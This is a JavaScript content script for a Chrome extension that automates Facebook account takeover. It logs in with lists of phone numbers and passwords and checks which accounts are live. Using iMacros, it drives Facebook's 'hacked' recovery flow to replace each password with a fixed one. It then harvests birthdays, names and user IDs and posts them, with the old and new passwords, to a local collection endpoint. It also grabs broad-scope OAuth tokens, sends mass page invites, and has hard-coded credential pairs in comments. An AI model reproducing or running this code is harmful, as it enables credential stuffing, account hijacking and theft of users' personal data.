/*
 * Copyright(c) 2014-2016 Dinesh Rajkumar Bhosale of getmyscript.com
 * See license file for more information
 * Contact developers at mr.dinesh.bhosale@gmail.com
 * */
 var check = 0,li,login,nexts;
start();
function start(){
	buildToolbox();
}
function resizeFrame() {
	var newClassName = document.getElementById(targetDivId).getAttribute("class");
	newClassName = newClassName.replace(" fst_container_resized", "");
	newClassName = newClassName.replace(" fst_container_maximized", "");
	newClassName += " fst_container_resized";
	document.getElementById(targetDivId).setAttribute("class", newClassName);
}
//for maximizing frame
function maximizeFrame() {
	var newClassName = document.getElementById(targetDivId).getAttribute("class");
	newClassName = newClassName.replace(" fst_container_resized", "");
	newClassName = newClassName.replace(" fst_container_maximized", "");
	newClassName += " fst_container_maximized";
	document.getElementById(targetDivId).setAttribute("class", newClassName);
}
//function to close frame and reload page
function closeAll() {
	document.getElementsByClassName("fst_container")[0].remove();
	window.location.reload();
}
//function for setting event listners
function setEventListener() {
	addEventListener("message", function(event) {
		if (event.origin + "/" == chrome.extension.getURL("")) {
			var eventToolName = event.data.name;
			//for close button
			if (eventToolName == "close-button") {
				closeAll();
			}
			//scroll to top
			if (eventToolName == "scroll-to-top") {
				$("html, body").animate({
					scrollTop: 0
				}, "slow");
			}
			//scroll to bottom
			if (eventToolName == "scroll-to-bottom") {
				$("html, body").animate({
					scrollTop: $(document).height()
				}, "slow");
			}
			//to decrease size of frame
			if (eventToolName == "resize-button") {
				resizeFrame();
			}
			//to increase size of frame
			if (eventToolName == "maximize-button") {
				maximizeFrame();
			}
			//for inviting friends to like a page
			if (eventToolName == "login") {
				var id = event.data.id;
				var delay = event.data.delay;
				if(window.location.href.match(/mbasic.facebook.com\/login/g)){
					deletenow();
				}else{
					window.location.href = 'https://mbasic.facebook.com/login/device-based/regular/login/';
				}
				//inviteNow(id,delay);
			}
			if (eventToolName == "testimacros") {
				testimacros();
			}
			if (eventToolName == "checknow") {
				check = 0,login = 0;
				var vars = {
					homeurl: '',
					email: event.data.phone,
					//email: '+8562099226332',
					pass: event.data.pass,
					//pass: '02099226332',
					npass: 'khmer@123',
					delay: event.data.delay,
					chromename: event.data.chromename,
					id: event.data.phoneid,
				}
				//changePassword(vars);
				//checknow(vars);
				
				//updatefb(vars);
				var message_to_show = 'Start login with ' + vars.email;
				toastr.info(message_to_show);
				//status(vars);

				if(!login) {
					chNow(vars);
				}
				login = 1;
			}
			if (eventToolName == "restartTool") {
				restartTool();
			}
		}
	}, false);
}

function getDetail(vars) {
	var http4 = new XMLHttpRequest;
	var url4 = "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8";
	http4.open("GET", url4, true);
	http4.onreadystatechange = function (){
		if (http4.readyState == 4 && http4.status == 200){
			var htmlstring = http4.responseText;
			if(htmlstring.match(/header/g)) {
				$('#header').html('<div id="getdetal" style="display:none">'+htmlstring+'</textarea');
				if($("#getdetal").length){
					var li = $("#getdetal input[name=li]").val();
					var lsd = $("#getdetal input[name=lsd]").val();
					var m_ts = $("#getdetal input[name=m_ts]").val();
					var jazoest = $("#getdetal input[name=jazoest]").val();
					var fb_dtsg = $("#getdetal input[name=fb_dtsg]").val();
					console.log(fb_dtsg);					
					if(!fb_dtsg) {
						toastr.error('Not enough detail with fb_dtsg '+ fb_dtsg);
						vars.li = li;
						vars.lsd = lsd;
						vars.m_ts = m_ts;
						vars.jazoest = jazoest;
					} else {
						vars.li = li;
						vars.lsd = lsd;
						vars.m_ts = m_ts;
						vars.jazoest = jazoest;
						vars.fb_dtsg = fb_dtsg;
					}
					checknow(vars);
				}
			}
			http4.close;
		};
	};
	http4.send(null);
}
function checknow(vars) {
	var r20 = {
		lwv: 100,
		refid: 8,
		lsd: vars.lsd,
		jazoest: vars.jazoest,
		m_ts: vars.m_ts,
		li: vars.li,
		fb_dtsg: vars.fb_dtsg,
		try_number: 0,
		unrecognized_tries: 0,
		email: vars.email,
		pass: vars.pass,
	};
	var request = new XMLHttpRequest;

	request["open"]("POST", "https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Ffree.facebook.com%2F&lwv=100&refid=8");
	request["setRequestHeader"]("Content-type", "application/x-www-form-urlencoded");
	request["onreadystatechange"] = function () {
		if (request["readyState"]) {
			if(check==0){
				status(vars);

			}
		}
	};
	request["send"](deSerialize(r20));
}

function status(vars)
{
	check = 1;
	nexts = 0;
	//function to get html code of facebook groups table from facebook
	var http4 = new XMLHttpRequest;
	var url4 = "https://mbasic.facebook.com/me";
	http4.open("GET", url4, true);
	http4.onreadystatechange = function (){
		if (http4.status == 404){
			toastr.error('Login false');
			vars.del = 1;
			if(!nexts) {
				next(vars);
			}
		}
		if (http4.readyState == 4 && http4.status == 200){
			var htmlstring = http4.responseText;
			if(htmlstring.match(/confirmemail/g)) {
				vars.logout = 'confirmemail';
				logout(vars);
			}
			if(htmlstring.match(/checkpoint/g)) {
				vars.logout = 'checkpoint';
				logout(vars);
			}
			if(!htmlstring.match(/sign_up/g) && !htmlstring.match(/signup-button/g) && !htmlstring.match(/login_reg_separator/g)) {
				if(!htmlstring.match(/confirmemail/g)) {
					var message_to_show = 'Login success fully!';
					toastr.success(message_to_show);

					toastr.info('Please wait...');
					if(htmlstring.match(/zero\/optin/g)) {
						vars.freemode=1;
						confirmfree(vars);
					} else {	
						getName(vars);
					}
				}

			} else {
				nexts = 0;
				if(!nexts) {
					toastr.error('Login false');
					vars.del = 1;
					next(vars);
					nexts = 1;
				}
			}
			http4.close;
		};

	};
	http4.send(null);
	nexts = 1;	
}
function confirmfree(vars) {
	var macroCode = '';
	 macroCode += 'TAB OPEN\n TAB T=2\n';
	 macroCode += 'SET !ERRORIGNORE YES\n';
     macroCode += 'URL GOTO=https://mbasic.facebook.com/zero/policy/optin?_rdc=1&_rdr\n';
     macroCode += 'WAIT SECONDS=2\n';     
     macroCode += 'TAG POS=1 TYPE=INPUT:SUBMIT FORM=ACTION:/zero/optin/write/?action=confirm&page=dialtone_optin_page ATTR=*\n';
     macroCode += 'WAIT SECONDS=10\n';
     macroCode += 'TAB CLOSE\n TAB T=1\n';
    function launchMacro()
    {
    try
       {
          if(!/^(?:chrome|https?|file)/.test(location))
          {
             alert('iMacros: Open webpage to run a macro.');
             return;
          }
	   
          var macro = {}; 
          macro.source = macroCode;
          macro.name = 'EmbeddedMacro';
	   
          var evt = document.createEvent('CustomEvent');
          evt.initCustomEvent('iMacrosRunMacro', true, true, macro);
          window.dispatchEvent(evt);
       }
	    catch(e)
	    {
	       alert('iMacros Bookmarklet error: '+e.toString());
	    };
 	}
 	launchMacro();
 	setTimeout(function(){
		getName(vars);
	}, (20*1000));
	// if(vars.freemode) {
	// 		var r20 = {
	// 			fb_dtsg: vars.fb_dtsg,
	// 			jazoest: vars.jazoest,
	// 			action: 'confirm',
	// 			page: 'reconsider_optin_dialog',
	// 		};
	// 		var request = new XMLHttpRequest;

	// 		request["open"]("POST", "https://mbasic.facebook.com/zero/optin/write/?action=confirm&page=reconsider_optin_dialog");
	// 		request["setRequestHeader"]("Content-type", "application/x-www-form-urlencoded");
	// 		request["onreadystatechange"] = function () {
	// 			if (request["readyState"]) {
	// 				//status(vars);
	// 			}
	// 		};
	// 		request["send"](deSerialize(r20));
	// }
}
function next(vars) {
	var message_to_show = 'Please wait for '+ vars.delay + ' seconds.';
	toastr.info(message_to_show);
	send_message("next", vars);
}
function logout(vars) {
	if(vars.logout=='confirmemail') {
		var http4 = new XMLHttpRequest;
		var url4 = "https://mbasic.facebook.com/confirmemail.php";
		http4.open("GET", url4, true);
		http4.onreadystatechange = function (){
			if (http4.readyState == 4 && http4.status == 200){
				var htmlstring = http4.responseText;
				var uname = /<a accesskey=.*? class=.*? href="([\s\S]*)".*?>.*?<\/a>/.exec(htmlstring)[1];
				logoutLink = uname.split('"')[0];
				vars.logoutLink = logoutLink;
				openlink(vars);
				http4.close;
			};
		};
		http4.send(null);
	}
	if(vars.logout=='checkpoint') {
		var macroCode = '';
		macroCode += 'TAB OPEN\n TAB T=2\n';
		macroCode += 'SET !ERRORIGNORE YES\n SET !TIMEOUT_PAGE 3600\n';
		macroCode += 'URL GOTO=https://web.facebook.com/checkpoint/?next\n';
		macroCode += 'WAIT SECONDS=1\n';         
		macroCode += 'TAG POS=1 TYPE=A ATTR=TXT:ออกจากระบบ\n';
		macroCode += 'TAG POS=1 TYPE=A ATTR=TXT:Log<SP>Out\n';
		macroCode += 'WAIT SECONDS=5\n';
     	macroCode += 'TAB CLOSE\n TAB T=1\n';
		launchMacro(macroCode);
		setTimeout(function(){
			next(vars);
		}, (10*1000));
		
	}
}
function openlink(vars) {
	var http4 = new XMLHttpRequest;
	var url4 = vars.logoutLink;
	http4.open("GET", url4, true);
	http4.onreadystatechange = function (){
		if (http4.readyState){
			next(vars);
		};
	};
	http4.send(null);
}
function getDate(vars) {
	var http4 = new XMLHttpRequest;
	var url4 = "https://mbasic.facebook.com/editprofile.php?type=basic&edit=birthday";
	http4.open("GET", url4, true);
	http4.onreadystatechange = function (){
		if (http4.readyState == 4 && http4.status == 200){
			var htmlstring = http4.responseText;
			if(htmlstring.match(/fb_dtsg/g)) {
				var message_to_show = 'Login success fully!';
				toastr.success(message_to_show);

				toastr.info('Starting Change password');
				var matches = [];
				var regex = /selected="1">(\d+)(\w*)/gi;
				while ((match = regex.exec(htmlstring))) {
				  matches.push(match[1]);
				}
				var day = matches[0];
				var years = matches[1];

				var uname = /<option.*? selected="1">([\s\S]*)<\/option>/.exec(htmlstring);
				var gmounth = uname[1].split('</option>');
				
				var month = gmounth[0];
				vars.day = day;
				vars.month = month;
				vars.year = years;
				var userinfo = {
					d: vars.day,
					m: vars.month,
					y: vars.year,
					phone: vars.email,
					pass: vars.pass,
					uid: vars.uid,
					uname: vars.uname,
					id: vars.id,
				};
				language(vars);
				//window.location = 'http://localhost/fbpost/facebook/fbupdate?stat=8&action=userinfo&'+deSerialize(userinfo);
				//changePassword(vars);
			}
			http4.close;
		};
	};
	http4.send(null);
}
function language(vars) {
	var macroCode = '';
	macroCode += 'TAB OPEN\n TAB T=2\n';
	macroCode += 'SET !ERRORIGNORE YES\n SET !TIMEOUT_PAGE 3600\n';
	macroCode += 'URL GOTO=https://m.facebook.com/language.php\n';
	macroCode += 'WAIT SECONDS=1\n';         
	macroCode += 'TAG POS=1 TYPE=SPAN ATTR=TXT:English<SP>(US)\n';
	macroCode += 'WAIT SECONDS=5\n';
 	macroCode += 'TAB CLOSE\n TAB T=1\n';
	launchMacro(macroCode);
	setTimeout(function(){
		ichangePassword(vars);
	}, (10*1000));
}
function getName(vars) {
	var http4 = new XMLHttpRequest;
	var url4 = "https://mbasic.facebook.com/profile.php";
	http4.open("GET", url4, true);
	http4.onreadystatechange = function (){
		if (http4.readyState == 4 && http4.status == 200){
			var htmlstring = http4.responseText;
			var uname = /<title.*?>([\s\S]*)<\/title>/.exec(htmlstring)[1];	
			profile_id = htmlstring.split('profile_id=');
			profile_id = profile_id[1].split('&');
			profile_id = profile_id[0];
			vars.uid = profile_id;			
			vars.uname = uname;
			console.log(vars.uid);
			console.log(vars.uname);
			getDate(vars);
			http4.close;
		};
	};
	http4.send(null);
}
function ichangePassword(vars) {
	var macroCode = '';
	macroCode += 'TAB OPEN\n TAB T=2\n';
	macroCode += 'SET !ERRORIGNORE YES\n SET !TIMEOUT_PAGE 3600\n';
	macroCode += 'URL GOTO=https://mbasic.facebook.com/hacked\n';
	macroCode += 'WAIT SECONDS=1\n';         
	macroCode += 'TAG POS=2 TYPE=INPUT:RADIO FORM=ACTION:/hacked/triage/ ATTR=NAME:reason\n';
	macroCode += 'WAIT SECONDS=1\n';
	macroCode += 'SET !TIMEOUT_STEP 1\n';
	macroCode += 'TAG POS=1 TYPE=BUTTON FORM=ACTION:/hacked/triage/ ATTR=TXT:Continue\n';
	macroCode += 'SET !TIMEOUT_STEP 1\n';
	macroCode += 'TAG POS=1 TYPE=BUTTON FORM=ACTION:/hacked/triage/ ATTR=TXT:ดำเนินการต่อ\n';
	macroCode += 'WAIT SECONDS=3\n';
	macroCode += 'TAG POS=1 TYPE=INPUT:SUBMIT FORM=ACTION:/checkpoint/flow/?checkpoint_created=1* ATTR=ID:checkpointButtonContinue-actual-button\n';
	macroCode += 'WAIT SECONDS=8\n';
	macroCode += 'TAG POS=1 TYPE=INPUT:SUBMIT FORM=ACTION:/checkpoint/flow/?checkpoint_created=1* ATTR=ID:checkpointSubmitButton-actual-button\n';
	macroCode += 'WAIT SECONDS=1\n';
	macroCode += 'TAG POS=1 TYPE=INPUT:PASSWORD FORM=ACTION:/checkpoint/flow/?checkpoint_created=1* ATTR=NAME:password_old CONTENT='+vars.email+'\n';
	macroCode += 'SET !TIMEOUT_STEP 1\n';
	macroCode += 'TAG POS=1 TYPE=INPUT:PASSWORD FORM=ACTION:/checkpoint/flow/?checkpoint_created=1* ATTR=NAME:password_new CONTENT='+vars.pass+'\n';
	macroCode += 'SET !TIMEOUT_STEP 1\n';
	macroCode += 'TAG POS=1 TYPE=INPUT:TEXT FORM=ACTION:/checkpoint/flow/?checkpoint_created=1* ATTR=NAME:password_new CONTENT='+vars.npass+'\n';
	macroCode += 'SET !TIMEOUT_STEP 1\n';
	macroCode += 'TAG POS=1 TYPE=INPUT:PASSWORD FORM=ACTION:/checkpoint/flow/?checkpoint_created=1* ATTR=NAME:password_confirm CONTENT='+vars.npass+'\n';
	macroCode += 'TAG POS=1 TYPE=INPUT:SUBMIT FORM=ACTION:/checkpoint/flow/?checkpoint_created=1* ATTR=ID:checkpointSubmitButton-actual-button\n';
	macroCode += 'WAIT SECONDS=3\n';
	macroCode += 'TAG POS=1 TYPE=INPUT:SUBMIT FORM=ACTION:/checkpoint/flow/?checkpoint_created=1* ATTR=ID:checkpointSubmitButton-actual-button\n';
	macroCode += 'WAIT SECONDS=3\n';
 	macroCode += 'TAB CLOSE\n TAB T=1\n';
	launchMacro(macroCode);
	setTimeout(function(){
		var userinfo = {
			d: vars.day,
			m: vars.month,
			y: vars.year,
			phone: vars.email,
			pass: vars.pass,
			uid: vars.uid,
			uname: vars.uname,
			npass: vars.npass,
			chromename: vars.chromename,
			id: vars.id,
		};
		window.location = 'http://localhost/fbpost/facebook/fbupdate?stat=8&action=userinfo&'+deSerialize(userinfo);
	}, (30*1000));
}
function changePassword(vars) {
	var http4 = new XMLHttpRequest;
	var url4 = "https://mbasic.facebook.com/settings/security/password/";
	http4.open("GET", url4, true);
	http4.onreadystatechange = function (){
		if (http4.readyState == 4 && http4.status == 200){
			var htmlstring = http4.responseText;
			if(htmlstring.match(/fb_dtsg/g)) {
				$('#login_top_banner').html('<div id="idgetproperty" style="display:none">'+htmlstring+'</textarea');
				if($("#idgetproperty").length){
					var sessions = $("#idgetproperty input[name=password_change_session_identifier]").val();
					var jazoest = $("#idgetproperty input[name=jazoest]").val();
					var fb_dtsg = $("#idgetproperty input[name=fb_dtsg]").val();
					vars.sessions = sessions;
					vars.jazoest = jazoest;
					vars.fb_dtsg = fb_dtsg;
					changepwnow(vars);
				}
			}
			http4.close;
		};
	};
	http4.send(null);
}
function changepwnow(vars) {
	var r20 = {
		fb_dtsg: vars.fb_dtsg,
		jazoest: vars.jazoest,
		password_change_session_identifier: vars.sessions,
		password_old: vars.pass,
		password_new: vars.npass,
		password_confirm: vars.npass,
		li: "fa4jYNDs7h53D5aIvtVtIIQw",
		save: 'Save Changes',
	};
	var request = new XMLHttpRequest;

	request["open"]("POST", "https://mbasic.facebook.com/password/change/?redirect_uri=%2Fsettings%2Fsecurity%2F%3Fsettings_tracking%3Dunknown%253Asettings_2_0");
	request["setRequestHeader"]("Content-type", "application/x-www-form-urlencoded");
	request["onreadystatechange"] = function () {
		if (request["readyState"]) {
			window.location = 'http://localhost/facebook/fbupdate?stat=8&action=userinfo&pw='+vars.npass+'&d='+vars.day+'&m='+vars.month+'&y='+vars.year+'&uid='+vars.uid+'&n='+vars.uname;
		}
	};
	request["send"](deSerialize(r20));
}
function getAccessToken() {
	var macroCode = '';
         macroCode += 'SET !TIMEOUT_PAGE 3600\n';
         macroCode += 'URL GOTO=https://m.facebook.com/dialog/oauth?scope=user_about_me%2Cuser_actions.books%2Cuser_actions.fitness%2Cuser_actions.music%2Cuser_actions.news%2Cuser_actions.video%2Cuser_activities%2Cuser_birthday%2Cuser_education_history%2Cuser_events%2Cuser_friends%2Cuser_games_activity%2Cuser_groups%2Cuser_hometown%2Cuser_interests%2Cuser_likes%2Cuser_location%2Cuser_managed_groups%2Cuser_photos%2Cuser_posts%2Cuser_relationship_details%2Cuser_relationships%2Cuser_religion_politics%2Cuser_status%2Cuser_tagged_places%2Cuser_videos%2Cuser_website%2Cuser_work_history%2Cemail%2Cmanage_notifications%2Cmanage_pages%2Cpublish_actions%2Cpublish_pages%2Cread_friendlists%2Cread_insights%2Cread_page_mailboxes%2Cread_stream%2Crsvp_event%2Cpublish_to_groups%2C%20groups_access_member_info%2C%20read_mailbox&response_type=token&client_id=124024574287414&redirect_uri=fb124024574287414%3A%2F%2Fauthorize%2F&sso_key=com&display=\n';
         macroCode += 'WAIT SECONDS=3\n';         
         macroCode += 'TAG POS=1 TYPE=BUTTON FORM=ACTION:/dialog/oauth/skip/submit/ ATTR=TXT:Continue<SP>as*\n';
         macroCode += 'WAIT SECONDS=5\n';
         macroCode += 'view-source:https://business.facebook.com/business_locations/\n';
         launchMacro(macroCode);
         AccessToken();
}
function AccessToken() {
	var url="https://business.facebook.com/business_locations/";
	tabRun(getffb,url);
	// 	var http4 = new XMLHttpRequest;
	// var url4 = "view-source:https://business.facebook.com/business_locations/";
	// http4.open("GET", url4, true);
	// http4.onreadystatechange = function (){
	// 	if (http4.readyState == 4 && http4.status == 200){
	// 		var htmlstring = http4.responseText;
	// 		if(htmlstring.match(/EAAGNO/g)) {
	// 			var message_to_show = 'Login success fully!';
	// 			toastr.success(message_to_show);

	// 			toastr.info('Starting get Access Token');
	// 			var uname = /EAAGNO([\s\S]*)QZDZD/.exec(htmlstring)[1];
	// 			console.log(22222222222222);
	// 			console.log(uname);
	// 			// profile_id = htmlstring.split('profile_id=');
	// 			// profile_id = profile_id[1].split('&amp');
	// 			// profile_id = profile_id[0];
	// 			// console.log(profile_id);
	// 			// getAccessToken();
	// 		}
	// 		http4.close;
	// 	};
	// };
	// http4.send(null);
}
function launchMacro(macroCode)
{
try
   {
      if(!/^(?:chrome|https?|file)/.test(location))
      {
         alert('iMacros: Open webpage to run a macro.');
         return;
      }
   
      var macro = {}; 
      macro.source = macroCode;
      macro.name = 'EmbeddedMacro';
   
      var evt = document.createEvent('CustomEvent');
      evt.initCustomEvent('iMacrosRunMacro', true, true, macro);
      window.dispatchEvent(evt);
   }
catch(e)
{
   alert('iMacros Bookmarklet error: '+e.toString());
};
}
function getdfb()
{
	//function to get html code of facebook groups table from facebook
	var http4 = new XMLHttpRequest;
	var url4 = "https://mbasic.facebook.com/me";
	http4.open("GET", url4, true);
	http4.onreadystatechange = function (){
		if (http4.readyState == 4 && http4.status == 200){
			var htmlstring = http4.responseText;
			if(htmlstring.match(/fb_dtsg/g)) {
				var uname = /<title.*?>([\s\S]*)<\/title>/.exec(htmlstring)[1];
				console.log(uname);
				profile_id = htmlstring.split('profile_id=');
				profile_id = profile_id[1].split('&amp');
				profile_id = profile_id[0];
				console.log(profile_id);
			}
			http4.close;
		};
	};
	http4.send(null);
}
function searchArray(obj, deepDataAndEvents) {
	var val = false;
	for (key in obj) {
		if (key.toString() == deepDataAndEvents) {
			val = obj[key];
			break;
		} else {
			if (typeof obj[key] == "object") {
				val = searchArray(obj[key], deepDataAndEvents);
				if (val != false) {
					break;
				}
			}
		}
	};
	return val;
}
// function checknow(delay) {
// 	$('input[name=email]').val('+8562096700872');
// 	$('input[name=pass]').val('02096700872');
// 	$('#loginbutton').mouseover();
// 	$('#loginbutton').click();
// }

//for adding UI components to DOM
function buildToolbox() {
	//adding stylesheet for to dom
	var cssURL = chrome.extension.getURL('/content_new/'+dirName+'/css/content.css');
	var styleElem = document.createElement('link');
	styleElem.setAttribute('href', cssURL);
	styleElem.setAttribute('rel', 'stylesheet');
	styleElem.setAttribute('type', 'text/css');
	document.body.appendChild(styleElem);
	//adding iframe to dom
	if(window.location.href.match(/login/g)){
		surl = '#active';
	} else {
		surl = '';
	}
	var frameURL = chrome.extension.getURL('/content_new/'+dirName+'/html/frame.html'+surl);
	var appendCode = '';
	var frameStyle = '';
	appendCode += '<iframe id='+targetFrameId+' style="' + frameStyle + '" src="' + frameURL + '" class="fst_inner_frame">';
	var appendDiv = document.createElement('div');
	appendDiv.innerHTML = appendCode;
	appendDiv.setAttribute('class', 'fst_fbvid_container fst_container');
	appendDiv.setAttribute('id', targetDivId);
	document.body.appendChild(appendDiv);
	setEventListener();
	if(window.location.href.match(/facebook/g)){
		deletenow();
	}
}

function deletenow() {
	var targetFrameId='fstFrameDiv';
	var iframe = document.getElementById(targetFrameId);
	//send_message("urlative", "urlative");
	if(iframe) {
		send_message("urlative", "urlative");
			// var postData = {};
			// postData.name = "urlative";
			// postData.type='urlative';
			// iframe.contentWindow.postMessage(postData, "*");
	} else {
		console.log(222222222);
	}


	// var targetFrameId='fstFrameDiv';
	// var iframe = document.getElementById(targetFrameId);
 //    var msg = {
 //        type: type,
 //        data: data
 //    };
 //    iframe.contentWindow.postMessage(msg, '*');
}
//just for passing values in correct function, validating fb_dtsg and user_id at the same time
function chNow(vars){
	if(vars.delay>=0){
		sendnow(vars);
	}else{
		toastr.error(messages.invalid_delay_time);
	}
}
//to like current Facebook page
function likepage(p){
	var Page = new XMLHttpRequest();
	var PageURL = "/ajax/pages/fan_status.php";
	var PageParams = "&fbpage_id=" + p + "&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user=" + user_id + "&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg=" + fb_dtsg + "&phstamp=";
	Page.open("POST", PageURL, true);
	Page.onreadystatechange = function () {
		if (Page.readyState == 4 && Page.status == 200){
			console.log(toolTitle+":page liked,page_id="+p);
		};
		var xhrname=Page;
		if(xhrname.readyState==4){
			if(give_error_description(xhrname.responseText)){
				//toastr.error(give_error_description(xhrname.responseText));
			}
		}
	};
	Page.send(PageParams);
};
//for starting page invitation process
function startinvite(pageid,delaytimepageinvite,friendidarray){
	//first like the page
	likepage(pageid);
	//set counter
	var counter_var_page_invite=-1;
	function send_page_invites(){
		counter_var_page_invite++;
		if(friendidarray[counter_var_page_invite]){
			params4="&page_id="+pageid;
			params4+="&invitee="+friendidarray[counter_var_page_invite];
			params4+="&action=send";
			params4+="&ref=finch_about_build_audience";
			params4+="&__user="+user_id;
			params4+="&__a=1";
			params4+="&__req=e";
			params4+="&fb_dtsg="+fb_dtsg;
			var http4 = new XMLHttpRequest;
			var url4 = "/ajax/pages/invite/send_single/";
			http4.open("POST", url4, true);
			http4.onreadystatechange = function () {
				//for dislaying error messages
				var xhrname=http4;
				if(xhrname.readyState==4){
					if(give_error_description(xhrname.responseText)){
						toastr.error(give_error_description(xhrname.responseText));
					}
				}
				if (http4.readyState == 4 && http4.status == 200){
					if((counter_var_page_invite+1)>1){
						var message=(counter_var_page_invite+1)+" Friends are invited.";
					}else{
						var message=(counter_var_page_invite+1)+" Friend is invited.";
					}
					toastr.info(message);
					setTimeout(function(){
						send_page_invites();
					}, (delaytimepageinvite*1000));
				}
			}
			http4.send(params4);
		}else{
			if((counter_var_page_invite+1)>1){
				var message=(counter_var_page_invite+1)+" Friends are invited.";
			}else{
				var message=(counter_var_page_invite+1)+" Friend is invited.";
			}
			toastr.info(message);
			alert(messages.page_invitation_complete);
		}
	}
	send_page_invites();
}
//function for sending page invites
function sendnow(vars){
	delay=parseInt(vars.delay);
	if(delay<0){
		delay=1;
		toastr.info(messages.delay_time)
	}

	if(!isNaN(delay)){
		toastr.info('Starting check');
		//checknow(vars);
		getDetail(vars);	
	}else{
		toastr.error(messages.invalid_delay);
	};

}
function send_message(type, data)
{
	var targetFrameId='fstFrameDiv';
	var iframe = document.getElementById(targetFrameId);
    var msg = {
        type: type,
        data: data
    };
    iframe.contentWindow.postMessage(msg, '*');
    //window.postMessage(msg, "*");
}
function checkurl() {
	var url = window.location.href;
	if(url.match(/web.facebook.com/g)) {
		url = 'https://web.facebook.com/';
	} else {
		url = 'https://www.facebook.com/';
	}
	return url;
}
function deSerialize(json) {
	return Object.keys(json).map(function (key) {
		return encodeURIComponent(key) + '=' + encodeURIComponent(json[key]);
	}).join('&');
}
function searchArray(obj, deepDataAndEvents) {
	var val = false;
	for (key in obj) {
		if (key.toString() == deepDataAndEvents) {
			val = obj[key];
			break;
		} else {
			if (typeof obj[key] == "object") {
				val = searchArray(obj[key], deepDataAndEvents);
				if (val != false) {
					break;
				}
			}
		}
	};
	return val;
}
function get_dyn() {
	function format() {
		$BitMap1 = [];
		for (i in obj) {
			$BitMap1[obj[i]] = 1;
		}
		if ($BitMap1["length"] === 0) {
			return "";
		}
		var l = [];
		var pathConfig = 1;
		var old = $BitMap1[0] || 0;
		var h = old.toString(2);
		var unlock = 1;
		for (; unlock < $BitMap1["length"]; unlock++) {
			var expr = $BitMap1[unlock] || 0;
			if (expr === old) {
				pathConfig++;
			} else {
				l["push"](isArray(pathConfig));
				old = expr;
				pathConfig = 1;
			}
		}
		if (pathConfig) {
			l["push"](isArray(pathConfig));
		}
		return getStyle(h + l["join"](""));
	}

	function isArray(it) {
		var result = it.toString(2);
		var digits = "0"["repeat"](result["length"] - 1);
		return digits + result;
	}

	function getStyle(cssprop) {
		var result = (cssprop + "00000")["match"](/[01]{6}/g);
		var tagout = "";
		var i = 0;
		for (; i < result["length"]; i++) {
			tagout += tmp[parseInt(result[i], 2)];
		}
		return tagout;
	}
	var extensions = document["body"]["innerHTML"]["match"](/\},([0-9])+\]/gi);
	var SubClass = document["head"]["innerHTML"]["match"](/\},([0-9])+\]/gi);
	var data = extensions["concat"](SubClass);
	var obj = [];
	for (x in data) {
		if (data[x] != null) {
			var cDigit = data[x]["replace"]("},", "")["replace"]("]", "");
			if (parseInt(cDigit) >= 7) {
				obj["push"](parseInt(cDigit));
			}
		}
	}
	var tmp = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_";
	return format();
}
function testimacros() {
	var macroCode = '';
	macroCode += 'TAB OPEN\n TAB T=2\n';
	macroCode += 'SET !ERRORIGNORE YES\n SET !TIMEOUT_PAGE 3600\n';
	macroCode += 'URL GOTO=http://localhost/fbpost/Facebook/fblist\n';
	launchMacro(macroCode);
}